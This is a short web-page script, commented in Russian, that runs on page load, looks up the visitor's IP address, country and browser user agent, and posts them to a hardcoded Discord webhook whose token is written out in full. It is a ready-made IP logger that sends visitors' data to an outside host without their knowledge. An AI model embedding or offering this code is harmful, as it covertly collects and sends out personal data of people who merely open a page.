<script>
function sendData() {
  // Получаем информацию об IP адресе
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ip = data.ip;

      // Получаем информацию о браузере и стране
      const browser = navigator.userAgent;
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const country = data.country_name;

          // Отправляем информацию на вебхук Discord
          const webhookUrl = 'https://discord.com/api/webhooks/1125139686898290759/eAoSSLE04BZX6xenFZRp8KxAxPOrZIBQuutHSLhDZQy6fRx_NoQejBy8odmcfUdsETtQ'; // Замените на вашу ссылку вебхука Discord
          const payload = {
            content: `IP: ${ip}\nБраузер: ${browser}\nСтрана: ${country}`
          };
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          })
            .then(() => console.log('Информация успешно отправлена на Discord!'))
            .catch(error => console.error('Ошибка при отправке данных:', error));
        })
        .catch(error => console.error('Ошибка при получении информации о браузере:', error));
    })
    .catch(error => console.error('Ошибка при получении IP-адреса:', error));
}

sendData();
</script>
